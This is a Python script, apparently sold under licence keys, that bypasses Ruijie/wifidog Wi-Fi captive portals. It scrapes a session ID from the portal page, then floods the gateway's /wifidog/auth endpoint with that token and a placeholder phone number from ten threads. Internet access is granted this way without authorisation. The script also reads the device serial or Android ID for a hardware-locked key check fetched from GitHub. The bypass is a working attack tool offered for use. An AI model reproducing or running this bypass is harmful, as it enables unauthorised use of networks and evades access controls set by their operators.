import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 10
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
DEBUG = False

# COLOR SYSTEM
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# ===============================
# GITHUB DATABASE CONFIG
# ===============================
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

# ===============================
# HWID & SECURITY FUNCTIONS
# ===============================
def get_hwid():
    """ဖုန်းရဲ့ Unique ID ကို ထုတ်ယူခြင်း"""
    try:
        # Serial Number သို့မဟုတ် Android ID ကို ယူမည်
        id_cmd = subprocess.check_output(['getprop', 'ro.serialno']).decode().strip()
        if not id_cmd or id_cmd == "unknown":
            id_cmd = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode().strip()
        # ဖတ်ရလွယ်အောင် ရှေ့က MOE- ခံပြီး ၈ လုံးပဲ ယူမည်
        return f"MOE-{id_cmd[:8].upper()}"
    except:
        return "MOE-UNKNOWN-ID"

def check_expiry(expiry_str):
    if expiry_str.upper() == "NONE" or expiry_str.upper() == "LIFETIME":
        return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        current_date = datetime.datetime.now()
        if current_date > expiry_date:
            return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except:
        return True, "Lifetime"

# ===============================
# UI FUNCTIONS
# ===============================
def display_hacker_flag():
    w = 40 
    yellow = f"[bold on yellow]{' ' * w}[/bold on yellow]"
    green  = f"[bold on green]{' ' * 19}★{' ' * 20}[/bold on green]"
    red    = f"[bold on red]{' ' * w}[/bold on red]"
    console.print(Align.center(Panel(f"{yellow}\n{green}\n{red}", border_style="bold white", padding=(0, 0), expand=False)))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.2[/bold cyan]"))
    console.print(Align.center("[bold #333333]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[/bold #333333]\n"))

def simpler_hacker_typing(text, style="bold green"):
    prefix = "[bold #00FF00]>>> [/bold #00FF00]"
    console.print(prefix, end="")
    for char in text:
        console.print(Text(char, style=style), end="")
        sys.stdout.flush()
        time.sleep(0.02)
    console.print()

def hacking_status(message, duration=0.8):
    with console.status(f"[bold green]{message}[/bold green]", spinner="dots12", spinner_style="bold green"):
        time.sleep(duration + random.uniform(0.1, 0.4))

def success_fireworks():
    colors = ["red", "orange", "yellow", "green", "cyan", "magenta", "white"]
    for _ in range(2):
        for _ in range(8):
            fire = " " * random.randint(1, 40) + random.choice(["✨", "💥", "🔥", "⚡"])
            console.print(Text(fire, style=random.choice(colors)))
            time.sleep(0.02)

# ===============================
# LICENSE CHECK WITH HWID LOCK
# ===============================
def check_license_hacker_style():
    my_hwid = get_hwid()
    console.clear()
    display_hacker_flag()
    
    # HWID ကို အပေါ်မှာ အမြဲပြထားမယ်
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", 
                                     title="[bold red]DEVICE INFO[/bold red]", 
                                     border_style="bold cyan", expand=False)))
    
    console.print(Align.center(Panel("[bold white]AWAITING AUTHORIZATION KEY[/bold white]", border_style="bold #00FF00", expand=False)))

    try:
        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
    except EOFError: user_key = ""
    
    if not user_key:
        sys.exit()

    hacking_status("Connecting to Secure Server...")
    try:
        response = requests.get(URL, timeout=10)
        lines = [line.strip() for line in response.text.splitlines() if line.strip()]
        
        found = False
        hacking_status("Verifying HWID & Expiry...")
        
        for entry in lines:
            # Format: Key|Expiry|HWID
            parts = entry.split("|")
            db_key = parts[0].strip()
            exp_date = parts[1].strip() if len(parts) > 1 else "None"
            db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"

            if user_key == db_key:
                found = True
                
                # 1. HWID Lock စစ်ဆေးခြင်း
                # db_hwid က "FREE" ဖြစ်နေရင် ဘယ်ဖုန်းမဆိုရမယ်၊ HWID ပါနေရင်တော့ တိုက်စစ်မယ်
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    simpler_hacker_typing("ACCESS_DENIED: HWID_MISMATCH", style="bold red")
                    console.print(f"\n[bold red]❌ ဒီ Key က တခြားဖုန်းမှာ သုံးထားပြီးသား ဖြစ်နေပါတယ်![/bold red]")
                    console.print(f"[bold yellow]⚠️ သင့် HWID ({my_hwid}) ကို Admin ဆီ ပို့ပြီး အတည်ပြုခိုင်းပါ။[/bold yellow]")
                    sys.exit()
                
                # 2. Expiry စစ်ဆေးခြင်း
                is_active, date_label = check_expiry(exp_date)
                if is_active:
                    success_fireworks()
                    simpler_hacker_typing(f"ACCESS_GRANTED: AUTHENTICATION SUCCESS")
                    console.print(Align.center(f"[bold green]STATUS: ACTIVE | EXPIRY: {date_label}[/bold green]\n"))
                    return True
                else:
                    simpler_hacker_typing("ACCESS_DENIED: KEY_EXPIRED", style="bold red")
                    console.print(f"\n[bold red]❌ သင့် Key မှာ သက်တမ်းကုန်ဆုံးသွားပါပြီ ({date_label})[/bold red]")
                    sys.exit()

        simpler_hacker_typing("ACCESS_DENIED: INVALID_KEY", style="bold red")
        console.print("\n[bold red]❌ Key မှားယွင်းနေပါသည်။ Admin ထံမှာ ဝယ်ယူပါ။[/bold red]")
        sys.exit()

    except Exception as e:
        console.print(f"\n[bold red]📡 DATABASE ERROR: Check internet connection.[/bold red]")
        sys.exit()

# ===============================
# BYPASS ENGINE FUNCTIONS
# ===============================
def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except:
        return False

def bypass_banner():
    print(f"""{MAGENTA}
╔══════════════════════════════════════╗
║        Ruijie All Version Bypass     ║
║        Moe Yu Special Edition        ║
╚══════════════════════════════════════╝
{RESET}""")

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            session.get(auth_link, timeout=5)
            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
        except:
            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
            break
        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))

def start_bypass_process():
    bypass_banner()
    logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
    while not stop_event.is_set():
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
                    time.sleep(5)
                    continue
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            if not sid:
                logging.warning(f"{RED}Session ID Not Found{RESET}")
                time.sleep(5)
                continue
            print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
            params = parse_qs(parsed_portal.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
            print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
            while check_real_internet():
                time.sleep(5)
        except Exception as e:
            time.sleep(5)

# ===============================
# MAIN EXECUTION
# ===============================
if __name__ == "__main__":
    if check_license_hacker_style():
        with console.status("[bold green]Injecting Packets...", spinner="shark"):
            time.sleep(1.5)
        console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
        try:
            start_bypass_process()
        except KeyboardInterrupt:
            stop_event.set()
            print(f"\n{RED}Turbo Engine Shutdown...{RESET}")
